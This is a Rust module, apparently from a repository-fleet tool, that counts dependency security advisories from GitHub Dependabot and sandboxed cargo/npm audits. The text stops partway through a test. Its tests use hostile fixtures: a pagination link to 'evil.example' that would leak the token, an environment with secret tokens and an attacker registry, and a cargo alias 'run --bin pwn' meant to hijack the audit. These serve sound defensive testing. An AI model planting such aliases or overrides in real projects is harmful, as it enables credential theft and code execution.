//! Fleet security advisories: how many known-vulnerable dependencies each repo
//! has, counted by severity.
//!
//! Two sources:
//!
//! - **GitHub Dependabot alerts** (`GET /repos/{owner}/{repo}/dependabot/alerts
//!   ?state=open`) for GitHub-remoted repos ([`refresh`], async). Reading
//!   alerts needs a token with the Dependabot-alerts read permission (the
//!   `security_events` scope for a classic token, or a public repo); a 403 or
//!   404 is cached as *unavailable* with a reason rather than treated as an
//!   error, since it's a stable answer for that repo and token.
//! - **Local audits**, opt-in via `AppConfig::local_audits` (off by default),
//!   for repos *without* a GitHub remote ([`refresh_local`], blocking):
//!   cargo-audit when `Cargo.lock` exists and cargo-audit is installed, npm
//!   audit when `package-lock.json` exists and npm is installed. Nothing is
//!   ever installed, a missing lockfile means the audit is skipped, and each
//!   run is time-boxed and killed if it overruns. The repo is treated as
//!   hostile: no tool runs with it as the working directory or reads its
//!   config (see [`audit_local`]).
//!
//! Results are cached in `advisory_cache` with a TTL, keyed like `ci_cache`:
//! (domain, slug) for Dependabot, ("local", repo id) for local audits. As in
//! `ci`, an `Err` (expired token, rate limit, network) never clobbers the last
//! known report.

use std::collections::{HashMap, HashSet};
use std::ffi::OsString;
use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

use futures_util::stream::{self, StreamExt};
use serde::{Deserialize, Serialize};

use crate::attention::AdvisoryFact;
use crate::model::{AppConfig, Host, Repo};
use crate::{cache, enrich, forge, oauth};

/// How long a cached report stays fresh. Advisories change slowly; a few
/// hours keeps API use and local audit runs low.
pub const TTL_SECS: i64 = 6 * 3600;

/// The cache "host" for local-audit rows (keyed by repo id).
pub const LOCAL_HOST: &str = "local";

/// Wall-clock budget for one local audit process.
pub const LOCAL_AUDIT_TIMEOUT: Duration = Duration::from_secs(90);

/// Max concurrent Dependabot requests in flight during a pass.
const CONCURRENCY: usize = 6;

/// Dependabot pages fetched per repo at most (100 alerts each).
const MAX_PAGES: usize = 10;

/// Open advisories by severity.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SeverityCounts {
    pub critical: u32,
    pub high: u32,
    pub medium: u32,
    pub low: u32,
    /// No usable severity (e.g. a CVSS 4.0-only advisory from cargo audit).
    pub unknown: u32,
}

impl SeverityCounts {
    pub fn total(&self) -> u32 {
        self.critical + self.high + self.medium + self.low + self.unknown
    }

    /// Count one advisory by its severity word (GitHub's `low`/`medium`/
    /// `high`/`critical`, npm's `info`/`moderate` too).
    fn add(&mut self, severity: &str, n: u32) {
        match severity.to_ascii_lowercase().as_str() {
            "critical" => self.critical += n,
            "high" => self.high += n,
            "medium" | "moderate" => self.medium += n,
            "low" | "info" => self.low += n,
            _ => self.unknown += n,
        }
    }
}

/// Where a report came from.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum AdvisorySource {
    Dependabot,
    CargoAudit,
    NpmAudit,
}

impl AdvisorySource {
    pub fn label(self) -> &'static str {
        match self {
            AdvisorySource::Dependabot => "Dependabot",
            AdvisorySource::CargoAudit => "cargo audit",
            AdvisorySource::NpmAudit => "npm audit",
        }
    }
}

/// One source's answer for one repo.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct AdvisoryReport {
    pub source: AdvisorySource,
    /// False when the source can't answer for this repo (no permission,
    /// alerts disabled, audit failed); `reason` says why and `counts` is zero.
    pub available: bool,
    pub counts: SeverityCounts,
    pub reason: Option<String>,
    /// Unix seconds.
    pub checked_at: i64,
}

impl AdvisoryReport {
    fn ok(source: AdvisorySource, counts: SeverityCounts, now: i64) -> Self {
        AdvisoryReport {
            source,
            available: true,
            counts,
            reason: None,
            checked_at: now,
        }
    }

    fn unavailable(source: AdvisorySource, reason: impl Into<String>, now: i64) -> Self {
        AdvisoryReport {
            source,
            available: false,
            counts: SeverityCounts::default(),
            reason: Some(reason.into()),
            checked_at: now,
        }
    }
}

/// What one pass did (the `ci::Outcome` shape): `updated` reports written
/// (including "unavailable" ones), `errors` fetches that failed without
/// touching the cache.
#[derive(Debug, Default)]
pub struct Outcome {
    pub updated: usize,
    pub errors: usize,
    pub last_error: Option<String>,
}

impl Outcome {
    pub fn all_failed(&self) -> bool {
        self.errors > 0 && self.updated == 0
    }
}

type FetchResult = Result<(String, String, AdvisoryReport), String>;

fn apply_results_on(conn: &rusqlite::Connection, results: Vec<FetchResult>) -> Outcome {
    let mut outcome = Outcome::default();
    for result in results {
        match result {
            Ok((host, key, report)) => match cache::store_advisories_on(conn, &host, &key, &report)
            {
                Ok(()) => outcome.updated += 1,
                Err(e) => {
                    outcome.errors += 1;
                    outcome.last_error = Some(e.to_string());
                }
            },
            Err(e) => {
                outcome.errors += 1;
                outcome.last_error = Some(e);
            }
        }
    }
    outcome
}

// ── Dependabot ──────────────────────────────────────────────────────────────

/// Refresh Dependabot counts for every GitHub-remoted repo whose cached report
/// is missing or older than [`TTL_SECS`] (all of them when `force`). A no-op
/// without a GitHub token.
pub async fn refresh(repos: &[Repo], now: i64, force: bool) -> Outcome {
    let Some(token) = oauth::github_token_async().await else {
        return Outcome::default();
    };
    let fresh = if force {
        HashSet::new()
    } else {
        cache::fresh_advisory_keys(TTL_SECS, now)
    };
    let jobs: Vec<(String, String)> =
        enrich::stale_remotes(repos, &fresh, |r| r.host == Some(Host::Github))
            .into_iter()
            .map(|(_, domain, slug)| (domain, slug))
            .collect();
    if jobs.is_empty() {
        return Outcome::default();
    }
    let token = token.as_str();
    let results: Vec<FetchResult> = stream::iter(jobs)
        .map(|(domain, slug)| async move {
            let report = dependabot_alerts(token, &slug, now).await?;
            Ok((domain, slug, report))
        })
        .buffer_unordered(CONCURRENCY)
        .collect()
        .await;
    let fetched = results.len();
    cache::try_with_conn(|conn| Ok(apply_results_on(conn, results))).unwrap_or_else(|e| Outcome {
        updated: 0,
        errors: fetched,
        last_error: Some(e),
    })
}

/// Open Dependabot alerts for `slug`, counted by severity. A 403/404 is an
/// `Ok` *unavailable* report (missing permission, alerts disabled, repo not
/// visible); 401, rate limits and 5xx are `Err` so the cache keeps its last
/// answer.
pub async fn dependabot_alerts(
    token: &str,
    slug: &str,
    now: i64,
) -> Result<AdvisoryReport, String> {
    forge::check_github_slug(slug)?;
    let mut url =
        format!("https://api.github.com/repos/{slug}/dependabot/alerts?state=open&per_page=100");
    let mut counts = SeverityCounts::default();
    for _ in 0..MAX_PAGES {
        let req = forge::client()
            .get(&url)
            .header("Accept", "application/vnd.github+json")
            .bearer_auth(token);
        let resp = forge::send(req, forge::GH_CORE).await?;
        let status = resp.status();
        if !status.is_success() {
            return match unavailable_reason(status) {
                Some(reason) => Ok(AdvisoryReport::unavailable(
                    AdvisorySource::Dependabot,
                    reason,
                    now,
                )),
                None => Err(format!("GitHub Dependabot {status}")),
            };
        }
        let next = resp
            .headers()
            .get(reqwest::header::LINK)
            .and_then(|v| v.to_str().ok())
            .and_then(next_link);
        let body: serde_json::Value = resp.json().await.map_err(|e| e.to_string())?;
        count_dependabot(&body, &mut counts)?;
        match next {
            Some(n) => url = n,
            None => break,
        }
    }
    Ok(AdvisoryReport::ok(AdvisorySource::Dependabot, counts, now))
}

/// The reason a non-2xx Dependabot answer means "unavailable" for this repo,
/// or `None` when it's a failure the caller must see (and not cache).
fn unavailable_reason(status: reqwest::StatusCode) -> Option<&'static str> {
    match status.as_u16() {
        403 => Some(
            "no access to Dependabot alerts (the token needs the security_events scope / \
             Dependabot alerts read permission)",
        ),
        404 => Some("Dependabot alerts are disabled, or the repository isn't visible"),
        _ => None,
    }
}

/// Fold one page of alerts into `counts`.
fn count_dependabot(body: &serde_json::Value, counts: &mut SeverityCounts) -> Result<(), String> {
    let alerts = body.as_array().ok_or("unexpected Dependabot response")?;
    for alert in alerts {
        let severity = alert
            .pointer("/security_advisory/severity")
            .or_else(|| alert.pointer("/security_vulnerability/severity"))
            .and_then(|v| v.as_str())
            .unwrap_or("");
        counts.add(severity, 1);
    }
    Ok(())
}

/// The `rel="next"` URL from a GitHub `Link` header, only if it stays on
/// `api.github.com` (the token rides along).
fn next_link(header: &str) -> Option<String> {
    header.split(',').find_map(|part| {
        let (url, params) = part.split_once(';')?;
        if !params.split(';').any(|p| p.trim() == "rel=\"next\"") {
            return None;
        }
        let url = url.trim().strip_prefix('<')?.strip_suffix('>')?;
        url.starts_with("https://api.github.com/")
            .then(|| url.to_string())
    })
}

// ── Local audits ────────────────────────────────────────────────────────────

/// Run the local audits for every repo *without* a GitHub remote whose cached
/// report is stale (all when `force`). Blocking: call it off the UI thread.
/// Repos with no lockfile, or whose tool isn't installed, are skipped.
///
/// **Opt-in**: a no-op unless `cfg.local_audits` is set (off by default).
/// Even sandboxed (see [`audit_local`]), running a tool over a lockfile from
/// a repo cloned from anywhere is a choice the user makes, not a default.
pub fn refresh_local(repos: &[Repo], cfg: &AppConfig, now: i64, force: bool) -> Outcome {
    if !cfg.local_audits {
        return Outcome::default();
    }
    let fresh = if force {
        HashSet::new()
    } else {
        cache::fresh_advisory_keys(TTL_SECS, now)
    };
    let mut results = Vec::new();
    for repo in repos.iter().filter(|r| r.host != Some(Host::Github)) {
        if fresh.contains(&(LOCAL_HOST.to_string(), repo.id.clone())) {
            continue;
        }
        if let Some(report) = audit_local(Path::new(&repo.id), LOCAL_AUDIT_TIMEOUT, now) {
            results.push(Ok((LOCAL_HOST.to_string(), repo.id.clone(), report)));
        }
    }
    if results.is_empty() {
        return Outcome::default();
    }
    let n = results.len();
    cache::try_with_conn(|conn| Ok(apply_results_on(conn, results))).unwrap_or_else(|e| Outcome {
        updated: 0,
        errors: n,
        last_error: Some(e),
    })
}

/// Audit one repo locally: cargo audit if it has a `Cargo.lock`, else npm
/// audit if it has a `package-lock.json`. `None` when neither applies or the
/// tool isn't installed. A failed or timed-out run is an *unavailable* report.
///
/// The repo is untrusted input, so neither tool runs *in* it:
///
/// - **cargo**: the `cargo-audit` binary is called directly (not `cargo
///   audit`, which would read the repo's `.cargo/config.toml` aliases and
///   honour its `rust-toolchain.toml`), with `--file <abs>/Cargo.lock`, from a
///   fresh empty directory, with a cleared environment (PATH, HOME and
///   CARGO_HOME only, so the user's advisory DB is found).
/// - **npm**: `package-lock.json` (+ `package.json`) is copied into a fresh
///   directory and audited there, so the repo's `.npmrc` (registry override,
///   `${ENV}` secrets in auth headers) is never read; the registry is pinned
///   to npmjs.org, user/global config point at an empty file, and the
///   environment is PATH plus a throwaway HOME. If the copy fails, npm
///   doesn't run.
pub fn audit_local(path: &Path, timeout: Duration, now: i64) -> Option<AdvisoryReport> {
    let lockfile = path.join("Cargo.lock");
    if lockfile.is_file() {
        if let Ok(bin) = which::which("cargo-audit") {
            let report = match Sandbox::new() {
                Ok(sandbox) => {
                    let lockfile = lockfile.canonicalize().unwrap_or(lockfile);
                    let plan = cargo_audit_plan(&bin, &lockfile, sandbox.path(), env_var);
                    run_timeboxed(plan.command(), timeout)
                }
                Err(e) => Err(e),
            };
            return Some(audit_report(
                AdvisorySource::CargoAudit,
                report,
                parse_cargo_audit,
                now,
            ));
        }
    }
    if path.join("package-lock.json").is_file() {
        if let Ok(bin) = which::which("npm") {
            let report = Sandbox::new().and_then(|sandbox| {
                stage_npm(path, sandbox.path())?;
                let plan = npm_audit_plan(&bin, sandbox.path(), env_var);
                run_timeboxed(plan.command(), timeout)
            });
            return Some(audit_report(
                AdvisorySource::NpmAudit,
                report,
                parse_npm_audit,
                now,
            ));
        }
    }
    None
}

fn env_var(key: &str) -> Option<OsString> {
    std::env::var_os(key)
}

/// A fully specified audit process: program, argv, working directory and the
/// *complete* environment (the command is built with `env_clear`). Pure data,
/// so the sandboxing is unit-testable without running anything.
#[derive(Debug, Clone, PartialEq, Eq)]
struct AuditPlan {
    program: PathBuf,
    args: Vec<OsString>,
    cwd: PathBuf,
    env: Vec<(OsString, OsString)>,
}

impl AuditPlan {
    fn command(&self) -> Command {
        let mut cmd = Command::new(&self.program);
        cmd.args(&self.args)
            .current_dir(&self.cwd)
            .env_clear()
            .envs(self.env.iter().map(|(k, v)| (k, v)));
        cmd
    }
}

/// `cargo-audit audit --json --file <lockfile>`, run from `cwd` (a fresh,
/// empty directory) with only PATH, HOME and CARGO_HOME. `env` reads the
/// app's own environment (injected for tests).
fn cargo_audit_plan(
    bin: &Path,
    lockfile: &Path,
    cwd: &Path,
    env: impl Fn(&str) -> Option<OsString>,
) -> AuditPlan {
    let home = env("HOME");
    let cargo_home = env("CARGO_HOME").or_else(|| {
        home.as_ref()
            .map(|h| Path::new(h).join(".cargo").into_os_string())
    });
    let mut vars = Vec::new();
    for (key, value) in [
        ("PATH", env("PATH")),
        ("HOME", home),
        ("CARGO_HOME", cargo_home),
    ] {
        if let Some(v) = value {
            vars.push((OsString::from(key), v));
        }
    }
    let mut args: Vec<OsString> = ["audit", "--json", "--file"].map(OsString::from).into();
    args.push(lockfile.as_os_str().to_owned());
    AuditPlan {
        program: bin.to_path_buf(),
        args,
        cwd: cwd.to_path_buf(),
        env: vars,
    }
}

/// `npm audit --json --package-lock-only` inside `dir` (holding the staged
/// lockfile and an empty npmrc), registry pinned, user/global config pointed
/// at the empty file, HOME set to `dir`, and nothing else but PATH.
fn npm_audit_plan(bin: &Path, dir: &Path, env: impl Fn(&str) -> Option<OsString>) -> AuditPlan {
    let rc = dir.join(EMPTY_NPMRC);
    let flag = |name: &str, path: &Path| {
        let mut s = OsString::from(name);
        s.push(path.as_os_str());
        s
    };
    let mut args: Vec<OsString> = [
        "audit",
        "--json",
        "--package-lock-only",
        "--registry=https://registry.npmjs.org/",
    ]
    .map(OsString::from)
    .into();
    args.push(flag("--userconfig=", &rc));
    args.push(flag("--globalconfig=", &rc));
    let mut vars = Vec::new();
    if let Some(path) = env("PATH") {
        vars.push((OsString::from("PATH"), path));
    }
    vars.push((OsString::from("HOME"), dir.as_os_str().to_owned()));
    AuditPlan {
        program: bin.to_path_buf(),
        args,
        cwd: dir.to_path_buf(),
        env: vars,
    }
}

/// The empty npm config file written into the npm sandbox.
const EMPTY_NPMRC: &str = "empty-npmrc";

/// Copy just the npm manifests into `dir` and write the empty npmrc. Only
/// regular files are copied (a symlinked lockfile is refused), and a failed
/// lockfile copy is an error so npm never runs without it.
fn stage_npm(repo: &Path, dir: &Path) -> Result<(), String> {
    let copy = |name: &str| -> Result<bool, String> {
        let src = repo.join(name);
        match std::fs::symlink_metadata(&src) {
            Ok(md) if md.is_file() => std::fs::copy(&src, dir.join(name))
                .map(|_| true)
                .map_err(|e| format!("couldn't stage {name}: {e}")),
            Ok(_) => Err(format!("{name} isn't a regular file")),
            Err(_) => Ok(false),
        }
    };
    if !copy("package-lock.json")? {
        return Err("couldn't stage package-lock.json".into());
    }
    copy("package.json")?;
    std::fs::write(dir.join(EMPTY_NPMRC), "").map_err(|e| e.to_string())
}

/// A fresh, private, empty temp directory, removed on drop.
struct Sandbox(PathBuf);

impl Sandbox {
    fn new() -> Result<Self, String> {
        use std::os::unix::fs::DirBuilderExt;
        use std::sync::atomic::{AtomicU64, Ordering};
        static SEQ: AtomicU64 = AtomicU64::new(0);
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        let dir = std::env::temp_dir().join(format!(
            "orrery-audit-{}-{nanos}-{}",
            std::process::id(),
            SEQ.fetch_add(1, Ordering::Relaxed)
        ));
        // `create` (not `create_all`) fails if it already exists, so the
        // directory is always one we made, mode 0700.
        std::fs::DirBuilder::new()
            .mode(0o700)
            .create(&dir)
            .map_err(|e| format!("couldn't create audit sandbox: {e}"))?;
        Ok(Sandbox(dir))
    }

    fn path(&self) -> &Path {
        &self.0
    }
}

impl Drop for Sandbox {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

fn audit_report(
    source: AdvisorySource,
    output: Result<(String, String), String>,
    parse: fn(&str) -> Result<SeverityCounts, String>,
    now: i64,
) -> AdvisoryReport {
    // Both tools exit non-zero when they find vulnerabilities, so the exit
    // code is ignored: the JSON on stdout is the answer.
    match output.and_then(|(stdout, stderr)| {
        parse(&stdout).map_err(|e| {
            let hint = stderr.lines().find(|l| !l.trim().is_empty()).unwrap_or("");
            if hint.is_empty() {
                e
            } else {
                format!("{e}: {hint}")
            }
        })
    }) {
        Ok(counts) => AdvisoryReport::ok(source, counts, now),
        Err(e) => AdvisoryReport::unavailable(source, e, now),
    }
}

/// Run `cmd` with stdin closed, collecting stdout/stderr, killing it if it
/// runs past `timeout`. Returns (stdout, stderr) whatever the exit status.
fn run_timeboxed(mut cmd: Command, timeout: Duration) -> Result<(String, String), String> {
    let mut child = cmd
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| e.to_string())?;
    // Drain both pipes on their own threads so a chatty child can't block on
    // a full pipe while we wait for it.
    let drain = |pipe: Option<Box<dyn Read + Send>>| {
        std::thread::spawn(move || {
            let mut buf = String::new();
            if let Some(mut p) = pipe {
                let _ = p.read_to_string(&mut buf);
            }
            buf
        })
    };
    let out = drain(
        child
            .stdout
            .take()
            .map(|p| Box::new(p) as Box<dyn Read + Send>),
    );
    let err = drain(
        child
            .stderr
            .take()
            .map(|p| Box::new(p) as Box<dyn Read + Send>),
    );
    let started = Instant::now();
    loop {
        match child.try_wait() {
            Ok(Some(_)) => break,
            Ok(None) if started.elapsed() > timeout => {
                let _ = child.kill();
                let _ = child.wait();
                return Err(format!("timed out after {}s", timeout.as_secs()));
            }
            Ok(None) => std::thread::sleep(Duration::from_millis(50)),
            Err(e) => return Err(e.to_string()),
        }
    }
    Ok((
        out.join().unwrap_or_default(),
        err.join().unwrap_or_default(),
    ))
}

/// Counts from `cargo audit --json`. RustSec advisories carry a CVSS vector
/// rather than a severity word, so v3 vectors are scored ([`cvss3_severity`]);
/// anything else counts as unknown. Warnings (unmaintained, yanked) aren't
/// vulnerabilities and aren't counted.
fn parse_cargo_audit(stdout: &str) -> Result<SeverityCounts, String> {
    let json: serde_json::Value =
        serde_json::from_str(stdout).map_err(|_| "cargo audit gave no JSON report".to_string())?;
    let list = json
        .pointer("/vulnerabilities/list")
        .and_then(|v| v.as_array())
        .ok_or("cargo audit report has no vulnerability list")?;
    let mut counts = SeverityCounts::default();
    for v in list {
        let severity = v
            .pointer("/advisory/cvss")
            .and_then(|c| c.as_str())
            .and_then(cvss3_severity)
            .unwrap_or("unknown");
        counts.add(severity, 1);
    }
    Ok(counts)
}

/// Counts from `npm audit --json` (npm 7+: `metadata.vulnerabilities`).
fn parse_npm_audit(stdout: &str) -> Result<SeverityCounts, String> {
    let json: serde_json::Value =
        serde_json::from_str(stdout).map_err(|_| "npm audit gave no JSON report".to_string())?;
    if let Some(err) = json.pointer("/error/summary").and_then(|v| v.as_str()) {
        return Err(err.to_string());
    }
    let vulns = json
        .pointer("/metadata/vulnerabilities")
        .and_then(|v| v.as_object())
        .ok_or("npm audit report has no vulnerability summary")?;
    let mut counts = SeverityCounts::default();
    for (severity, n) in vulns {
        if severity == "total" {
            continue;
        }
        counts.add(severity, n.as_u64().unwrap_or(0) as u32);
    }
    Ok(counts)
}

/// Severity word for a CVSS 3.x vector (`CVSS:3.1/AV:N/AC:L/…`), from its
/// base score per the CVSS 3.1 specification. `None` for other versions or a
/// malformed vector.
fn cvss3_severity(vector: &str) -> Option<&'static str> {
    let mut parts = vector.split('/');
    let version = parts.next()?;
    if version != "CVSS:3.0" && version != "CVSS:3.1" {
        return None;
    }
    let metrics: HashMap<&str, &str> = parts.filter_map(|p| p.split_once(':')).collect();
    let get = |k: &str| metrics.get(k).copied();
    let changed = match get("S")? {
        "U" => false,
        "C" => true,
        _ => return None,
    };
    let av = match get("AV")? {
        "N" => 0.85,
        "A" => 0.62,
        "L" => 0.55,
        "P" => 0.2,
        _ => return None,
    };
    let ac = match get("AC")? {
        "L" => 0.77,
        "H" => 0.44,
        _ => return None,
    };
    let pr = match (get("PR")?, changed) {
        ("N", _) => 0.85,
        ("L", false) => 0.62,
        ("L", true) => 0.68,
        ("H", false) => 0.27,
        ("H", true) => 0.5,
        _ => return None,
    };
    let ui = match get("UI")? {
        "N" => 0.85,
        "R" => 0.62,
        _ => return None,
    };
    let cia = |k: &str| match get(k)? {
        "H" => Some(0.56),
        "L" => Some(0.22),
        "N" => Some(0.0),
        _ => None,
    };
    let (c, i, a) = (cia("C")?, cia("I")?, cia("A")?);
    let iss: f64 = 1.0 - (1.0 - c) * (1.0 - i) * (1.0 - a);
    let impact = if changed {
        7.52 * (iss - 0.029) - 3.25 * (iss - 0.02).powi(15)
    } else {
        6.42 * iss
    };
    let exploitability = 8.22 * av * ac * pr * ui;
    let score = if impact <= 0.0 {
        0.0
    } else if changed {
        roundup((1.08 * (impact + exploitability)).min(10.0))
    } else {
        roundup((impact + exploitability).min(10.0))
    };
    Some(match score {
        s if s >= 9.0 => "critical",
        s if s >= 7.0 => "high",
        s if s >= 4.0 => "medium",
        s if s > 0.0 => "low",
        _ => "none",
    })
}

/// CVSS 3.1 "round up to one decimal" (Appendix A), integer-safe.
fn roundup(x: f64) -> f64 {
    let n = (x * 100_000.0).round() as i64;
    if n % 10_000 == 0 {
        n as f64 / 100_000.0
    } else {
        ((n / 10_000) + 1) as f64 / 10.0
    }
}

// ── Attention facts ─────────────────────────────────────────────────────────

/// Attention facts from the cached reports, for repos in the current fleet
/// with at least one open advisory. A Dependabot report applies to every
/// local clone of that remote (worktrees included); a local report to its
/// own repo. Sorted by repo id.
pub fn facts(
    reports: &HashMap<(String, String), AdvisoryReport>,
    repos: &[Repo],
) -> Vec<AdvisoryFact> {
    let mut out: Vec<AdvisoryFact> = repos
        .iter()
        .filter_map(|r| {
            let report = match (&r.slug, r.host) {
                (Some(slug), Some(Host::Github)) => {
                    reports.get(&(r.remote_host.clone().unwrap_or_default(), slug.clone()))?
                }
                _ => reports.get(&(LOCAL_HOST.to_string(), r.id.clone()))?,
            };
            (report.available && report.counts.total() > 0).then(|| AdvisoryFact {
                repo_id: r.id.clone(),
                source: report.source.label().to_string(),
                counts: report.counts,
            })
        })
        .collect();
    out.sort_by(|a, b| a.repo_id.cmp(&b.repo_id));
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::enrich::test_support::sample;

    #[test]
    fn counts_dependabot_alerts_by_severity() {
        let body = serde_json::json!([
            {"number": 1, "state": "open", "security_advisory": {"severity": "critical"},
             "security_vulnerability": {"severity": "critical"}},
            {"number": 2, "state": "open", "security_advisory": {"severity": "high"}},
            {"number": 3, "state": "open", "security_advisory": {"severity": "high"}},
            {"number": 4, "state": "open", "security_vulnerability": {"severity": "medium"}},
            {"number": 5, "state": "open", "security_advisory": {"severity": "low"}},
            {"number": 6, "state": "open"}
        ]);
        let mut counts = SeverityCounts::default();
        count_dependabot(&body, &mut counts).unwrap();
        assert_eq!(
            counts,
            SeverityCounts {
                critical: 1,
                high: 2,
                medium: 1,
                low: 1,
                unknown: 1
            }
        );
        assert_eq!(counts.total(), 6);
        // An error object (not an array) is an error, not zero alerts.
        let err = serde_json::json!({"message": "Bad credentials"});
        assert!(count_dependabot(&err, &mut counts).is_err());
    }

    #[test]
    fn forbidden_and_missing_are_unavailable_but_auth_and_server_errors_are_not() {
        use reqwest::StatusCode;
        assert!(unavailable_reason(StatusCode::FORBIDDEN).is_some());
        assert!(unavailable_reason(StatusCode::NOT_FOUND).is_some());
        for s in [
            StatusCode::UNAUTHORIZED,
            StatusCode::TOO_MANY_REQUESTS,
            StatusCode::INTERNAL_SERVER_ERROR,
        ] {
            assert!(unavailable_reason(s).is_none(), "{s}");
        }
    }

    #[test]
    fn next_link_follows_github_pagination_only_on_api_host() {
        let h = r#"<https://api.github.com/repositories/1/dependabot/alerts?page=2>; rel="next", <https://api.github.com/repositories/1/dependabot/alerts?page=5>; rel="last""#;
        assert_eq!(
            next_link(h).as_deref(),
            Some("https://api.github.com/repositories/1/dependabot/alerts?page=2")
        );
        assert_eq!(
            next_link(r#"<https://api.github.com/x?page=1>; rel="prev""#),
            None
        );
        // Never send the token off api.github.com.
        assert_eq!(next_link(r#"<https://evil.example/x>; rel="next""#), None);
    }

    #[test]
    fn parses_cargo_audit_json() {
        let json = r#"{
          "database": {"advisory-count": 900},
          "lockfile": {"dependency-count": 300},
          "vulnerabilities": {"found": true, "count": 3, "list": [
            {"advisory": {"id": "RUSTSEC-2024-0001",
              "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}},
            {"advisory": {"id": "RUSTSEC-2024-0002",
              "cvss": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"}},
            {"advisory": {"id": "RUSTSEC-2024-0003", "cvss": null}}
          ]},
          "warnings": {"unmaintained": [{"advisory": {"id": "RUSTSEC-2024-0100"}}]}
        }"#;
        let counts = parse_cargo_audit(json).unwrap();
        assert_eq!(
            counts,
            SeverityCounts {
                critical: 1,
                high: 0,
                medium: 1,
                low: 0,
                unknown: 1
            }
        );
        let clean = r#"{"vulnerabilities": {"found": false, "count": 0, "list": []}}"#;
        assert_eq!(parse_cargo_audit(clean).unwrap().total(), 0);
        assert!(parse_cargo_audit("error: couldn't fetch advisory db").is_err());
    }

    #[test]
    fn parses_npm_audit_json() {
        let json = r#"{
          "auditReportVersion": 2,
          "vulnerabilities": {},
          "metadata": {"vulnerabilities":
            {"info": 1, "low": 2, "moderate": 3, "high": 4, "critical": 5, "total": 15}}
        }"#;
        assert_eq!(
            parse_npm_audit(json).unwrap(),
            SeverityCounts {
                critical: 5,
                high: 4,
                medium: 3,
                low: 3,
                unknown: 0
            }
        );
        let err = r#"{"error": {"code": "ENOLOCK", "summary": "This command requires an existing lockfile."}}"#;
        assert_eq!(
            parse_npm_audit(err).unwrap_err(),
            "This command requires an existing lockfile."
        );
    }

    #[test]
    fn cvss3_scores_match_the_reference_calculator() {
        // 9.8
        assert_eq!(
            cvss3_severity("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
            Some("critical")
        );
        // 7.5
        assert_eq!(
            cvss3_severity("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"),
            Some("high")
        );
        // 5.9
        assert_eq!(
            cvss3_severity("CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"),
            Some("medium")
        );
        // 6.1 (scope changed)
        assert_eq!(
            cvss3_severity("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"),
            Some("medium")
        );
        // 3.3
        assert_eq!(
            cvss3_severity("CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"),
            Some("low")
        );
        assert_eq!(
            cvss3_severity("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N"),
            Some("none")
        );
        assert_eq!(cvss3_severity("CVSS:4.0/AV:N/AC:L/AT:N"), None);
        assert_eq!(cvss3_severity("CVSS:3.1/AV:N"), None);
    }

    #[test]
    fn run_timeboxed_kills_overrunning_processes() {
        let mut cmd = Command::new("sleep");
        cmd.arg("5");
        let started = Instant::now();
        let err = run_timeboxed(cmd, Duration::from_millis(200)).unwrap_err();
        assert!(err.contains("timed out"), "{err}");
        assert!(started.elapsed() < Duration::from_secs(3));

        let mut cmd = Command::new("echo");
        cmd.arg("{}");
        let (out, _) = run_timeboxed(cmd, Duration::from_secs(5)).unwrap();
        assert_eq!(out.trim(), "{}");
    }

    #[test]
    fn audit_local_skips_repos_without_a_lockfile() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("Cargo.toml"), "[package]").unwrap();
        std::fs::write(dir.path().join("package.json"), "{}").unwrap();
        assert_eq!(audit_local(dir.path(), Duration::from_secs(1), 0), None);
    }

    /// The app's environment as a test sees it: secrets and repo-steering
    /// overrides that must never reach an audit process.
    fn hostile_env(key: &str) -> Option<OsString> {
        match key {
            "PATH" => Some("/usr/bin:/bin".into()),
            "HOME" => Some("/home/u".into()),
            "GITHUB_TOKEN" => Some("ghp_secret".into()),
            "NPM_TOKEN" => Some("npm_secret".into()),
            "RUSTUP_TOOLCHAIN" => Some("evil".into()),
            "NPM_CONFIG_REGISTRY" => Some("https://evil.example/".into()),
            _ => None,
        }
    }

    fn env_keys(plan: &AuditPlan) -> Vec<&str> {
        plan.env.iter().map(|(k, _)| k.to_str().unwrap()).collect()
    }

    #[test]
    fn cargo_plan_never_runs_in_the_repo_or_through_cargo() {
        // A hostile repo: a cargo alias that would hijack `cargo audit`, and a
        // pinned toolchain rustup would download.
        let repo = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(repo.path().join(".cargo")).unwrap();
        std::fs::write(
            repo.path().join(".cargo/config.toml"),
            "[alias]\naudit = \"run --bin pwn\"\n",
        )
        .unwrap();
        std::fs::write(repo.path().join("rust-toolchain.toml"), "[toolchain]\n").unwrap();
        let lock = repo.path().join("Cargo.lock");
        std::fs::write(&lock, "").unwrap();
        let sandbox = Sandbox::new().unwrap();

        let plan = cargo_audit_plan(
            Path::new("/usr/bin/cargo-audit"),
            &lock,
            sandbox.path(),
            hostile_env,
        );
        assert_eq!(plan.program, Path::new("/usr/bin/cargo-audit"));
        assert_eq!(
            plan.args,
            vec![
                OsString::from("audit"),
                "--json".into(),
                "--file".into(),
                lock.clone().into_os_string(),
            ]
        );
        assert_eq!(plan.cwd, sandbox.path());
        assert!(!plan.cwd.starts_with(repo.path()));
        // The sandbox holds nothing for cargo to pick up.
